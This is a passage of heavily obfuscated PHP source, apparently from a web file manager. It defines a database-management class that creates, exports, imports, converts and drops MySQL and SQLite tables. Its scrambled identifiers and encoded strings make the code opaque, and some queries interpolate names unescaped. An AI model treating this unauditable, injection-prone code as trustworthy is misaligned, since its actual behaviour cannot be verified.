$–‘ô¸€…); } else { if (method_exists(self, $ªóÙáâ)) { return call_user_func_array(array(self, $ªóÙáâ), $–‘ô¸€…); } else { show_json("{$ªóÙáâ}\x28\51\x20\156\157\x74\40\x65\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($Çê¬“„É, $±¦ÙÁø¼) { self::$_methodList[$Çê¬“„É] = $±¦ÙÁø¼; } public static function addMethodStatic($ğââ§›, $Ğ†¹†Íı) { self::$_methodListStatic[$ğââ§›] = $Ğ†¹†Íı; } } goto f˜î³âó¬İ; D”ÏÏ˜¼­: class DbManage { function __construct($·ÕêÀˆ = array()) { $æîÚ©Òç =& $_SERVER[® ¨Ä®ñ]; if (empty($·ÕêÀˆ)) { $·ÕêÀˆ = $GLOBALS[$æîÚ©Òç[6]][$æîÚ©Òç[21]]; } $this->database = $·ÕêÀˆ; } public function model($†áŸà–À = '') { return new ModelBase($†áŸà–À, $_SERVER[® ¨Ä®ñ][12], $this->database); } public function db($Éˆı‡Ğ = false) { $¢ÜÊª´Å =& $_SERVER[® ¨Ä®ñ]; $šş¼äÙœ = array_change_key_case($this->database); if ($this->dbType() == $¢ÜÊª´Å[13] || !$Éˆı‡Ğ) { return $this->model()->db(); } $–éØÒ = $šş¼äÙœ[$¢ÜÊª´Å[956]]; $šş¼äÙœ[$¢ÜÊª´Å[956]] = $¢ÜÊª´Å[12]; if ($šş¼äÙœ[$¢ÜÊª´Å[951]] == $¢ÜÊª´Å[948]) { $´÷¯æäµ = $šş¼äÙœ[$¢ÜÊª´Å[957]]; $šş¼äÙœ[$¢ÜÊª´Å[957]] = substr($´÷¯æäµ, 0, strrpos($´÷¯æäµ, $¢ÜÊª´Å[1043])); } $this->database = $šş¼äÙœ; $Â”ı²Ú = $this->model()->db(); try { $¿¨§ƒÎ„ = $Â”ı²Ú->execute("\x73\150\x6f\x77\x20\x64\x61\x74\141\x62\x61\163\145\163\40\154\x69\x6b\x65\x20\x27{$–éØÒ}\47"); } catch (Exception $—¸–èÂ­) { } if (!$¿¨§ƒÎ„) { $Â”ı²Ú->execute("\143\162\145\141\164\145\x20\x64\x61\164\141\x62\141\163\145\40\140{$–éØÒ}\x60"); } $šş¼äÙœ[$¢ÜÊª´Å[956]] = $–éØÒ; if ($šş¼äÙœ[$¢ÜÊª´Å[951]] == $¢ÜÊª´Å[948]) { $šş¼äÙœ[$¢ÜÊª´Å[957]] .= $¢ÜÊª´Å[1043] . $–éØÒ; } $this->database = $šş¼äÙœ; $Â”ı²Ú->execute("\165\x73\145\40\x60{$–éØÒ}\140"); return $Â”ı²Ú; } public function createTable($‹×¶İ¨¬, &$„À¦‡ƒ±) { $”Ÿò‡å =& $_SERVER[® ¨Ä®ñ]; if (!IO::exist($‹×¶İ¨¬)) { ActionCall($”Ÿò‡å[1044], !0, 0); show_json(LNG($”Ÿò‡å[1045]), !1); } $Š«¨³® = $this->model()->db(); $²Ğ„©Û¼ = sqlSplit(IO::getContent($‹×¶İ¨¬)); foreach ($²Ğ„©Û¼ as $šÕú¦ÓÆ) { $ŒÜÍ¡öù = stripos($šÕú¦ÓÆ, $”Ÿò‡å[1046]) === 0; if ($ŒÜÍ¡öù) { $„À¦‡ƒ±->task[$”Ÿò‡å[768]] += 1; } $Š«¨³®->execute($šÕú¦ÓÆ); if ($ŒÜÍ¡öù) { preg_match($”Ÿò‡å[1047], $šÕú¦ÓÆ, $Š­ƒ¼ß); $„À¦‡ƒ±->task[$”Ÿò‡å[1048]] = $Š­ƒ¼ß[1]; $„À¦‡ƒ±->update(1); } } } public function insertTable($¸ÑğŠ´°, &$ì†””¿ò) { $é™¡™š¦ =& $_SERVER[® ¨Ä®ñ]; $âµÔßÏµ = $this->model()->db(); $”ëÈœ’ = $Şâ€ÏŠ‚ ? array($Şâ€ÏŠ‚) : $âµÔßÏµ->getTables(); foreach ($¸ÑğŠ´° as $İ€‡½Óé) { $Şâ€ÏŠ‚ = basename($İ€‡½Óé, $é™¡™š¦[770]); if (!in_array($Şâ€ÏŠ‚, $”ëÈœ’)) { continue; } $ì†””¿ò->task[$é™¡™š¦[1048]] = $Şâ€ÏŠ‚; if (get_filesize($İ€‡½Óé) == 0) { continue; } $¼ÛÌ¿¡ = $this->sqlToDb($İ€‡½Óé, $ì†””¿ò); if (!$¼ÛÌ¿¡) { ActionCall($é™¡™š¦[1044], !0, 0); show_json(LNG($é™¡™š¦[1049]) . "\133{$Şâ€ÏŠ‚}\135", !1); } } } public function sqlFromDb($”°™é¦ù, $âÏİ¤¬ì, &$ÕŸßƒ­÷, $¸ƒĞõÄ™ = '') { if ($ÕŸßƒ­÷) { $ÕŸßƒ­÷->task[$_SERVER[® ¨Ä®ñ][1048]] = $”°™é¦ù; } $¤µ·üù¨ = $this->model($”°™é¦ù); $«£­ŸÀé = 0; $ë‚¹Ì = 0; $à†½ëõ² = 10000; $¹¦å—‹Ñ = fopen($âÏİ¤¬ì, $_SERVER[® ¨Ä®ñ][1050]); $ê²¢‚Õ = $¤µ·üù¨->getPk(); $Ëâ°Ç¦ = $¤µ·üù¨->getDbFields(); $Æ¦ ä€ = $_SERVER[® ¨Ä®ñ][12]; if ($GLOBALS[$_SERVER[® ¨Ä®ñ][769]] && in_array($”°™é¦ù, array($_SERVER[® ¨Ä®ñ][1051], $_SERVER[® ¨Ä®ñ][1052]))) { $Æ¦ ä€ = $”°™é¦ù; } do { $õ§èÎï = array($ê²¢‚Õ => array($_SERVER[® ¨Ä®ñ][998], $ë‚¹Ì)); $ÁÛàÜÔŸ = $¤µ·üù¨->where($õ§èÎï)->field($Ëâ°Ç¦)->order($ê²¢‚Õ . $_SERVER[® ¨Ä®ñ][1053])->limit($à†½ëõ²)->select(); $ÁÛàÜÔŸ = !empty($ÁÛàÜÔŸ) ? $ÁÛàÜÔŸ : array(); if (!($·˜´áö• = count($ÁÛàÜÔŸ))) { break; } $ªáÁ› ı = end($ÁÛàÜÔŸ); $ë‚¹Ì = $ªáÁ› ı[$ê²¢‚Õ]; $†ó†Çû = array(); foreach ($ÁÛàÜÔŸ as $ƒÒŸí½Ä) { if ($Æ¦ ä€) { if ($”°™é¦ù == $_SERVER[® ¨Ä®ñ][1051]) { if ($ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][33]] == $_SERVER[® ¨Ä®ñ][1054]) { $™é›…÷à = json_decode($ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][369]], !0); if ($™é›…÷à[$_SERVER[® ¨Ä®ñ][32]] == $GLOBALS[$_SERVER[® ¨Ä®ñ][769]] && $™é›…÷à[$_SERVER[® ¨Ä®ñ][732]] != 1) { continue; } } } else { if ($ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][33]] == $_SERVER[® ¨Ä®ñ][1055] && $ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][95]] == $_SERVER[® ¨Ä®ñ][761]) { continue; } } } if ($¸ƒĞõÄ™) { $ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][78]] = "\x7b\x69\157\x3a{$¸ƒĞõÄ™}\x7d" . substr($ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][78]], strlen("\173\151\x6f\x3a{$ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][799]]}\175")); $ƒÒŸí½Ä[$_SERVER[® ¨Ä®ñ][799]] = $¸ƒĞõÄ™; } $†ó†Çû[] = $_SERVER[® ¨Ä®ñ][1056] . $this->sqlEncode($ƒÒŸí½Ä) . $_SERVER[® ¨Ä®ñ][1057]; } $·Ç™§„È = "\111\x4e\x53\105\x52\x54\40\x49\x4e\x54\x4f\40\140{$”°™é¦ù}\x60\x20\x28\x60" . implode($_SERVER[® ¨Ä®ñ][1058], $Ëâ°Ç¦) . $_SERVER[® ¨Ä®ñ][1059]; fwrite($¹¦å—‹Ñ, $·Ç™§„È . implode($_SERVER[® ¨Ä®ñ][1060], $†ó†Çû) . $_SERVER[® ¨Ä®ñ][71] . PHP_EOL); $«£­ŸÀé += $·˜´áö•; if ($ÕŸßƒ­÷) { $ÕŸßƒ­÷->update($·˜´áö•); } } while ($à†½ëõ² == $·˜´áö•); fclose($¹¦å—‹Ñ); return $«£­ŸÀé; } public function sqlToDb($Ãš¸×ä¿, &$©¢ŠÁƒ•) { $¾³–¡Æ¼ =& $_SERVER[® ¨Ä®ñ]; $ãŒÊÇä = $this->model()->db(); $¡ĞäÎÇş = @fopen($Ãš¸×ä¿, $¾³–¡Æ¼[1061]); if (!$¡ĞäÎÇş) { return !1; } $ô†ÀˆÓÌ = 0; $‹Œ·Ãü¬ = $¾³–¡Æ¼[12]; $ùÉ­÷í = array(); $‰©‚—¶ = $this->dbType(); $¸ø”ñ = $‰©‚—¶ == $¾³–¡Æ¼[13] ? 500 : 2000; $Ì³Ä¿øÓ = basename($Ãš¸×ä¿, $¾³–¡Æ¼[770]); $İ”µµÄ = 0; $¢·¿Ò§ª = 4194304 - 104858; $¬¢‹úıå = 1000000 - 104858; while (!feof($¡ĞäÎÇş)) { $ËÇÔ¨“Ä = trim(fgets($¡ĞäÎÇş)); if (!$ËÇÔ¨“Ä) { continue; } $ÈáœÀ½Å = $this->sqlDecode($ËÇÔ¨“Ä, $‰©‚—¶, $Ì³Ä¿øÓ); if (stripos($ÈáœÀ½Å, $¾³–¡Æ¼[350]) === 0) { if (!$‹Œ·Ãü¬) { $‹Œ·Ãü¬ = $ÈáœÀ½Å . $¾³–¡Æ¼[53]; } continue; } if ($©¢ŠÁƒ•) { $©¢ŠÁƒ•->task[$¾³–¡Æ¼[768]] += 1; } $ô†ÀˆÓÌ++; $ùÉ­÷í[] = rtrim(rtrim(trim($ÈáœÀ½Å), $¾³–¡Æ¼[50]), $¾³–¡Æ¼[71]); $„×ß÷è = null; $×‡Şƒôä = strlen($ÈáœÀ½Å); $İ”µµÄ += $×‡Şƒôä; if ($İ”µµÄ >= ($¸ø”ñ == 500 ? $¬¢‹úıå : $¢·¿Ò§ª)) { $„×ß÷è = array_pop($ùÉ­÷í); if ($ô†ÀˆÓÌ > 1) { $ô†ÀˆÓÌ--; } } if ($ô†ÀˆÓÌ >= $¸ø”ñ || $„×ß÷è) { $ÈáœÀ½Å = $‹Œ·Ãü¬ . implode($¾³–¡Æ¼[50], $ùÉ­÷í); if (!$ãŒÊÇä->execute($ÈáœÀ½Å)) { return !1; } if ($©¢ŠÁƒ•) { $©¢ŠÁƒ•->update($ô†ÀˆÓÌ); } $ùÉ­÷í = array(); $ô†ÀˆÓÌ = 0; $İ”µµÄ = 0; if ($„×ß÷è) { $ùÉ­÷í = array($„×ß÷è); $ô†ÀˆÓÌ = 1; $İ”µµÄ = $×‡Şƒôä; } } } fclose($¡ĞäÎÇş); if (!empty($ùÉ­÷í)) { $ÈáœÀ½Å = $‹Œ·Ãü¬ . implode($¾³–¡Æ¼[50], $ùÉ­÷í); if (!$ãŒÊÇä->execute($ÈáœÀ½Å)) { return !1; } if ($©¢ŠÁƒ•) { $©¢ŠÁƒ•->update($ô†ÀˆÓÌ); } } return !0; } public function dropTable($æÛ÷Û€± = null) { $³Úë±£Ä = $this->model()->db(); $Ó²£ƒİŸ = $æÛ÷Û€± ? array($æÛ÷Û€±) : $³Úë±£Ä->getTables(); if (!$Ó²£ƒİŸ) { return; } foreach ($Ó²£ƒİŸ as $æÛ÷Û€±) { if ($æÛ÷Û€±) { $æÛ÷Û€± = strtolower($æÛ÷Û€±); } else { continue; } $³Úë±£Ä->execute("\x64\162\x6f\160\40\x74\x61\x62\x6c\145\x20\151\146\x20\x65\x78\x69\163\164\163\x20\140{$æÛ÷Û€±}\140"); } } private function sqlEncode($ßÔÒìƒ) { $Öåññ†ƒ =& $_SERVER[® ¨Ä®ñ]; $ªÏåÖ„ = array(); foreach ($ßÔÒìƒ as $¨«”Í¦‹) { if (is_array($¨«”Í¦‹)) { $¨«”Í¦‹ = json_encode_force($¨«”Í¦‹); } $¨«”Í¦‹ = addslashes($¨«”Í¦‹); $¨«”Í¦‹ = str_replace(array($Öåññ†ƒ[1062], $Öåññ†ƒ[226]), array($Öåññ†ƒ[1063], $Öåññ†ƒ[1064]), $¨«”Í¦‹); $ªÏåÖ„[] = str_replace($Öåññ†ƒ[58], $Öåññ†ƒ[1065], $¨«”Í¦‹); } return $Öåññ†ƒ[58] . implode($Öåññ†ƒ[1066], $ªÏåÖ„) . $Öåññ†ƒ[58]; } private function sqlDecode($¡€×ì™•, $ÑŸÄĞ›à, $â¸ÕÊÊé = '') { $…ªŒº…Õ =& $_SERVER[® ¨Ä®ñ]; $¡€×ì™• = str_replace(array($…ªŒº…Õ[1063], $…ªŒº…Õ[1064]), array($…ªŒº…Õ[1062], $…ªŒº…Õ[226]), $¡€×ì™•); if ($ÑŸÄĞ›à == $…ªŒº…Õ[13]) { return $â¸ÕÊÊé != $…ªŒº…Õ[1067] ? stripslashes($¡€×ì™•) : $¡€×ì™•; } if ($â¸ÕÊÊé == $…ªŒº…Õ[1067]) { $¡€×ì™• = str_replace($…ªŒº…Õ[1068], $…ªŒº…Õ[117], stripslashes($¡€×ì™•)); } return $¡€×ì™•; } public function getSqlFile($ÍÎ×èø„ = '') { $¤Åù¹ºÄ =& $_SERVER[® ¨Ä®ñ]; $•ÈÖâ¯ï = $this->dbType(!0); $°ÀãŞ‰ğ = CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\x6c\x2f\144\141\164\141\x2f{$•ÈÖâ¯ï}\x2e\x73\x71\154"; $­àš²Áã = file_get_contents($°ÀãŞ‰ğ); $áÄí÷ÃÕ = $¤Åù¹ºÄ[1069] . ($•ÈÖâ¯ï == $¤Åù¹ºÄ[786] ? $¤Åù¹ºÄ[1070] : $¤Åù¹ºÄ[1071]) . $¤Åù¹ºÄ[1072]; preg_match_all($áÄí÷ÃÕ, $­àš²Áã, $Ã–Õ¬…ã); $ÂÁó‹µÏ = $Ã–Õ¬…ã[1]; $Ş§ÒêÉá = $this->model()->db(); $´ì¯—× = $Ş§ÒêÉá->getTables(); $¢Â…µú = TEMP_FILES . $¤Åù¹ºÄ[1073] . date($¤Åù¹ºÄ[733]) . $¤Åù¹ºÄ[8]; del_dir($¢Â…µú); mk_dir($¢Â…µú); $ç«Ã‹º· = $¢Â…µú . $¤Åù¹ºÄ[1074]; $ÌÈÑ´û³ = $¢Â…µú . $¤Åù¹ºÄ[1075]; $ÆãÏòãø = $•ÈÖâ¯ï == $¤Åù¹ºÄ[13] ? $¤Åù¹ºÄ[786] : $¤Åù¹ºÄ[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\141\154\154\57\144\x61\x74\x61\x2f{$ÆãÏòãø}\56\163\161\x6c", $¢Â…µú); @touch($¢Â…µú . $•ÈÖâ¯ï . $¤Åù¹ºÄ[770]); $øõ£Ÿ· = fopen($ç«Ã‹º·, $¤Åù¹ºÄ[1050]); $Ï£Ç»›Š = fopen($ÌÈÑ´û³, $¤Åù¹ºÄ[1050]); if ($•ÈÖâ¯ï == $¤Åù¹ºÄ[13]) { $´ì¯—× = array_diff($´ì¯—×, array($¤Åù¹ºÄ[766], $¤Åù¹ºÄ[767])); $öå³éÜ = array($¤Åù¹ºÄ[1076], $¤Åù¹ºÄ[1077], $¤Åù¹ºÄ[1078]); fwrite($Ï£Ç»›Š, implode(PHP_EOL, $öå³éÜ) . PHP_EOL . PHP_EOL); foreach ($´ì¯—× as $‘ÂÚœ†) { $šÕñµ™ = $this->sqlFromSqlite($‘ÂÚœ†); if (!$šÕñµ™[$¤Åù¹ºÄ[13]]) { continue; } fwrite($Ï£Ç»›Š, $šÕñµ™[$¤Åù¹ºÄ[13]] . PHP_EOL . PHP_EOL); if (!in_array($‘ÂÚœ†, $ÂÁó‹µÏ)) { fwrite($øõ£Ÿ·, $šÕñµ™[$¤Åù¹ºÄ[786]] . PHP_EOL . PHP_EOL); } } } else { foreach ($´ì¯—× as $‘ÂÚœ†) { $šÕñµ™ = $this->sqlFromMysql($‘ÂÚœ†); if (!$šÕñµ™[$¤Åù¹ºÄ[786]]) { continue; } fwrite($øõ£Ÿ·, $šÕñµ™[$¤Åù¹ºÄ[786]] . PHP_EOL . PHP_EOL); if (!in_array($‘ÂÚœ†, $ÂÁó‹µÏ)) { fwrite($Ï£Ç»›Š, $šÕñµ™[$¤Åù¹ºÄ[13]] . PHP_EOL . PHP_EOL); } } } fclose($øõ£Ÿ·); fclose($Ï£Ç»›Š); $­àš²Áã = array($¤Åù¹ºÄ[786] => $ç«Ã‹º·, $¤Åù¹ºÄ[13] => $ÌÈÑ´û³); return $ÍÎ×èø„ ? $­àš²Áã[$ÍÎ×èø„] : $­àš²Áã; } public function dbType($Ã©€Ë¾¼ = false) { $Ÿşº¡‹â =& $_SERVER[® ¨Ä®ñ]; $ê‡Åõˆ¨ = $Ã©€Ë¾¼ ? $GLOBALS[$Ÿşº¡‹â[6]][$Ÿşº¡‹â[21]] : $this->database; $ê‡Åõˆ¨ = array_change_key_case($ê‡Åõˆ¨); $Ë„Ç‰Û = $ê‡Åõˆ¨[$Ÿşº¡‹â[951]]; if ($Ë„Ç‰Û == $Ÿşº¡‹â[948]) { $¨Á®ºµ† = explode($Ÿşº¡‹â[4], $ê‡Åõˆ¨[$Ÿşº¡‹â[957]]); $Ë„Ç‰Û = $¨Á®ºµ†[0]; } $­åÍ‚»ş = array($Ÿşº¡‹â[1079] => $Ÿşº¡‹â[13], $Ÿşº¡‹â[894] => $Ÿşº¡‹â[786]); if (isset($­åÍ‚»ş[$Ë„Ç‰Û])) { $Ë„Ç‰Û = $­åÍ‚»ş[$Ë„Ç‰Û]; } return $Ë„Ç‰Û; } public function sqlFromMysql($”ÀÑÌÔ¢, $äŞ‰ÒÑ† = '') { $ÏÊıíÇŞ =& $_SERVER[® ¨Ä®ñ]; $¥Ì¥ˆòè = $this->model()->db(); $¨¬îâ’¦ = $¥Ì¥ˆòè->query($ÏÊıíÇŞ[1080] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[380]); if (!$¨¬îâ’¦ || !$¨¬îâ’¦[0]) { return !1; } $ñóíâ™˜ = _get($¨¬îâ’¦[0], $ÏÊıíÇŞ[1081], $ÏÊıíÇŞ[12]); if (!$ñóíâ™˜) { return !1; } $°˜‡õ­Å = "\104\122\x4f\x50\x20\x54\101\x42\114\x45\40\x49\106\40\x45\x58\111\x53\124\x53\40\x60{$”ÀÑÌÔ¢}\140\x3b" . PHP_EOL . $ñóíâ™˜ . $ÏÊıíÇŞ[71]; if ($äŞ‰ÒÑ† && $äŞ‰ÒÑ† == $ÏÊıíÇŞ[786]) { return $°˜‡õ­Å; } $ü…“«çâ = array_change_key_case($GLOBALS[$ÏÊıíÇŞ[6]][$ÏÊıíÇŞ[21]]); $‡Õ§˜å = $ü…“«çâ[$ÏÊıíÇŞ[956]]; $ÎÔİóÏ = $ÏÊıíÇŞ[1082] . $‡Õ§˜å . $ÏÊıíÇŞ[1083] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[58]; $ş½É§õÅ = $ÏÊıíÇŞ[1084] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[882]; $¼ïÕé» = $¥Ì¥ˆòè->query($ÎÔİóÏ); if (empty($¼ïÕé»)) { $ÌÅ¢º‡Ş = array($ÏÊıíÇŞ[786] => $ÏÊıíÇŞ[12], $ÏÊıíÇŞ[13] => $ÏÊıíÇŞ[12]); return $äŞ‰ÒÑ† ? $ÌÅ¢º‡Ş[$äŞ‰ÒÑ†] : $ÌÅ¢º‡Ş; } $ˆÆ¡«‘ø = $¥Ì¥ˆòè->query($ş½É§õÅ); $¨•»·ò‡ = $ÏÊıíÇŞ[12]; $Ô°ÈÀ˜ = array(); foreach ($ˆÆ¡«‘ø as $ßÒÚ…ë‚) { if (!$¨•»·ò‡ && $ßÒÚ…ë‚[$ÏÊıíÇŞ[1085]] == $ÏÊıíÇŞ[1086]) { $¨•»·ò‡ = $ßÒÚ…ë‚[$ÏÊıíÇŞ[1087]]; } if (isset($Ô°ÈÀ˜[$ßÒÚ…ë‚[$ÏÊıíÇŞ[1085]]])) { $Ô°ÈÀ˜[$ßÒÚ…ë‚[$ÏÊıíÇŞ[1085]]][$ÏÊıíÇŞ[1088]][] = $ßÒÚ…ë‚[$ÏÊıíÇŞ[1087]]; continue; } $Ô°ÈÀ˜[$ßÒÚ…ë‚[$ÏÊıíÇŞ[1085]]] = array($ÏÊıíÇŞ[1089] => $ßÒÚ…ë‚[$ÏÊıíÇŞ[1085]], $ÏÊıíÇŞ[1088] => array($ßÒÚ…ë‚[$ÏÊıíÇŞ[1087]]), $ÏÊıíÇŞ[1090] => $ßÒÚ…ë‚[$ÏÊıíÇŞ[1091]] == $ÏÊıíÇŞ[89] ? 0 : 1); } $ˆ—æÔÉ” = array(); foreach ($Ô°ÈÀ˜ as $ßÒÚ…ë‚) { $ƒÆòÂêØ = $ßÒÚ…ë‚[$ÏÊıíÇŞ[1089]] == $ÏÊıíÇŞ[1086]; $ØÃ½À¯ = array($ÏÊıíÇŞ[1092], $ßÒÚ…ë‚[$ÏÊıíÇŞ[1090]] == $ÏÊıíÇŞ[89] && !$ƒÆòÂêØ ? $ÏÊıíÇŞ[1093] : $ÏÊıíÇŞ[12], $ÏÊıíÇŞ[1094], $ÏÊıíÇŞ[1095] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[11] . ($ƒÆòÂêØ ? $ÏÊıíÇŞ[1096] : $ßÒÚ…ë‚[$ÏÊıíÇŞ[1089]]) . $ÏÊıíÇŞ[117], $ÏÊıíÇŞ[1097], $ÏÊıíÇŞ[117] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[117], $ÏÊıíÇŞ[1098] . implode($ÏÊıíÇŞ[1099], $ßÒÚ…ë‚[$ÏÊıíÇŞ[1088]]) . $ÏÊıíÇŞ[1100]); $ˆ—æÔÉ”[] = implode($ÏÊıíÇŞ[53], $ØÃ½À¯) . $ÏÊıíÇŞ[71]; } $–©¿¬¥ = array(); $ù’¯İ™Ä = array($ÏÊıíÇŞ[1101] => $ÏÊıíÇŞ[1102], $ÏÊıíÇŞ[1102] => $ÏÊıíÇŞ[1102], $ÏÊıíÇŞ[283] => $ÏÊıíÇŞ[310], $ÏÊıíÇŞ[282] => $ÏÊıíÇŞ[310]); foreach ($¼ïÕé» as $ßÒÚ…ë‚) { $ØÃ½À¯ = array($ÏÊıíÇŞ[117] . $ßÒÚ…ë‚[$ÏÊıíÇŞ[1103]] . $ÏÊıíÇŞ[117], isset($ù’¯İ™Ä[$ßÒÚ…ë‚[$ÏÊıíÇŞ[1104]]]) ? $ù’¯İ™Ä[$ßÒÚ…ë‚[$ÏÊıíÇŞ[1104]]] : $ßÒÚ…ë‚[$ÏÊıíÇŞ[1105]], $ßÒÚ…ë‚[$ÏÊıíÇŞ[1106]] == $ÏÊıíÇŞ[880] ? $ÏÊıíÇŞ[1107] : $ÏÊıíÇŞ[1108], $ßÒÚ…ë‚[$ÏÊıíÇŞ[1103]] == $¨•»·ò‡ ? $ÏÊıíÇŞ[1109] : $ÏÊıíÇŞ[12], $ßÒÚ…ë‚[$ÏÊıíÇŞ[931]] ? strtoupper(str_replace($ÏÊıíÇŞ[11], $ÏÊıíÇŞ[12], $ßÒÚ…ë‚[$ÏÊıíÇŞ[931]])) : $ÏÊıíÇŞ[12]); $–©¿¬¥[] = trim(implode($ÏÊıíÇŞ[53], $ØÃ½À¯)); } $¶àçÆçß = array($ÏÊıíÇŞ[1110] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[1111], $ÏÊıíÇŞ[1112] . $”ÀÑÌÔ¢ . $ÏÊıíÇŞ[1113], implode($ÏÊıíÇŞ[50] . PHP_EOL, $–©¿¬¥), $ÏÊıíÇŞ[928]); $í·Ï¾– = implode(PHP_EOL, array_merge($¶àçÆçß, $ˆ—æÔÉ”)); if ($äŞ‰ÒÑ† && $äŞ‰ÒÑ† == $ÏÊıíÇŞ[13]) { return $í·Ï¾–; } $ÌÅ¢º‡Ş = array($ÏÊıíÇŞ[786] => $°˜‡õ­Å, $ÏÊıíÇŞ[13] => $í·Ï¾–); return $äŞ‰ÒÑ† ? $ÌÅ¢º‡Ş[$äŞ‰ÒÑ†] : $ÌÅ¢º‡Ş; } public function sqlFromSqlite($¢´À¡ÕØ, $âø€ğ€ = '') { $ÆÂø­Äî =& $_SERVER[® ¨Ä®ñ]; $ÃÕ»Ÿä = $this->model()->db(); $¤«ºÃ”é = "\120\x52\101\107\115\101\40\124\x41\x42\114\105\x5f\x49\116\x46\x4f\40\50\x27{$¢´À¡ÕØ}\47\51"; $Ë™şÙ“’ = "\123\x45\114\105\103\x54\x20\x2a\x20\106\122\x4f\x4d\40\x73\161\154\151\x74\145\137\x6d\x61\x73\164\145\162\40\127\110\105\122\x45\40\164\142\x6c\137\156\141\x6d\x65\x20\x3d\x20\47{$¢´À¡ÕØ}\x27"; $ƒø‡¨¶ = $ÃÕ»Ÿä->query($¤«ºÃ”é); if (empty($ƒø‡¨¶)) { $ĞÌÙ”Ïä = array($ÆÂø­Äî[786] => $ÆÂø­Äî[12], $ÆÂø­Äî[13] => $ÆÂø­Äî[12]); return $âø€ğ€ ? $ĞÌÙ”Ïä[$âø€ğ€] : $ĞÌÙ”Ïä; } $××©êµ = $ÃÕ»Ÿä->query($Ë™şÙ“’); $—º ½…‡ = $™š¢¨áË = array(); foreach ($××©êµ as $ÚÅÙğìÀ) { if ($ÚÅÙğìÀ[$ÆÂø­Äî[33]] == $ÆÂø­Äî[274]) { $—º ½…‡[] = $ÚÅÙğìÀ[$ÆÂø­Äî[1114]]; } else { $™š¢¨áË[$ÚÅÙğìÀ[$ÆÂø­Äî[32]]] = $ÚÅÙğìÀ[$ÆÂø­Äî[1114]]; } } $¾Ò¿ôãŒ = array_merge(array($ÆÂø­Äî[1110] . $¢´À¡ÕØ . $ÆÂø­Äî[117]), $—º ½…‡, array_values($™š¢¨áË)); $¾Ò¿ôãŒ = implode($ÆÂø­Äî[71] . PHP_EOL, $¾Ò¿ôãŒ) . $ÆÂø­Äî[71]; if ($âø€ğ€ && $âø€ğ€ == $ÆÂø­Äî[13]) { return $¾Ò¿ôãŒ; } $Ã»ÌÑÄ = array(); $Ç¶·ù½ = array($ÆÂø­Äî[1102] => $ÆÂø­Äî[1115], $ÆÂø­Äî[310] => $ÆÂø­Äî[1116]); $şãÉò„ = $ÆÂø­Äî[12]; foreach ($ƒø‡¨¶ as $ÚÅÙğìÀ) { if ($ÚÅÙğìÀ[$ÆÂø­Äî[57]] == $ÆÂø­Äî[89]) { $şãÉò„ = $ÚÅÙğìÀ[$ÆÂø­Äî[32]]; } $æûÓã–Ô = array($ÆÂø­Äî[380] . $ÚÅÙğìÀ[$ÆÂø­Äî[32]] . $ÆÂø­Äî[380], isset($Ç¶·ù½[$ÚÅÙğìÀ[$ÆÂø­Äî[33]]]) ? $Ç¶·ù½[$ÚÅÙğìÀ[$ÆÂø­Äî[33]]] : $ÚÅÙğìÀ[$ÆÂø­Äî[33]], $ÚÅÙğìÀ[$ÆÂø­Äî[35]] == $ÆÂø­Äî[89] ? $ÆÂø­Äî[1107] : $ÆÂø­Äî[1117] . $ÚÅÙğìÀ[$ÆÂø­Äî[56]], $ÚÅÙğìÀ[$ÆÂø­Äî[57]] == $ÆÂø­Äî[89] ? $ÆÂø­Äî[1118] : $ÆÂø­Äî[12]); $Ã»ÌÑÄ[] = trim(implode($ÆÂø­Äî[53], $æûÓã–Ô)); } foreach ($™š¢¨áË as $¨”Œ¸•º => $€¸ì¡öÜ) { $¶¼ñ¿’õ = str_replace($ÆÂø­Äî[1119] . $¢´À¡ÕØ . $ÆÂø­Äî[11], $ÆÂø­Äî[12], $¨”Œ¸•º); $Ö ŒåğÑ = str_replace(array($ÆÂø­Äî[117], $ÆÂø­Äî[939]), $ÆÂø­Äî[380], substr($€¸ì¡öÜ, stripos($€¸ì¡öÜ, $ÆÂø­Äî[255]))); if ($¶¼ñ¿’õ == $ÆÂø­Äî[1096]) { $½ä—•«× = $ÆÂø­Äî[1120] . $şãÉò„ . $ÆÂø­Äî[1121]; } else { $½ä—•«× = (stripos($¶¼ñ¿’õ, $ÆÂø­Äî[11]) ? $ÆÂø­Äî[1122] : $ÆÂø­Äî[12]) . ($ÆÂø­Äî[1123] . $¶¼ñ¿’õ . $ÆÂø­Äî[1124] . $Ö ŒåğÑ); } $Ã»ÌÑÄ[] = $½ä—•«×; } $¾§ç¸ì¸ = array($ÆÂø­Äî[1125] . $¢´À¡ÕØ . $ÆÂø­Äî[1126], $ÆÂø­Äî[1127] . $¢´À¡ÕØ . $ÆÂø­Äî[1128], implode($ÆÂø­Äî[50] . PHP_EOL, $Ã»ÌÑÄ), $ÆÂø­Äî[1129]); $‹ùËƒ³Ş = implode(PHP_EOL, $¾§ç¸ì¸); if ($âø€ğ€ && $âø€ğ€ == $ÆÂø­Äî[786]) { return $‹ùËƒ³Ş; } $ĞÌÙ”Ïä = array($ÆÂø­Äî[786] => $‹ùËƒ³Ş, $ÆÂø­Äî[13] => $¾Ò¿ôãŒ); return $âø€ğ€ ? $ĞÌÙ”Ïä[$âø€ğ€] : $ĞÌÙ”Ïä; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($˜è×é²ù, $ÆÔš¤) { $ğİÔÄ”´ =& $_SERVER[® ¨Ä®ñ]; $Ûú†´“• = $ÆÔš¤; $GLOBALS[$ğİÔÄ”´[1130]] = $ğİÔÄ”´[1131] . $˜è×é²ù; Hook::trigger($ğİÔÄ”´[1131] . $˜è×é²ù . $ğİÔÄ”´[1132], $Ûú†´“•); $¹åñ¹¹ì = 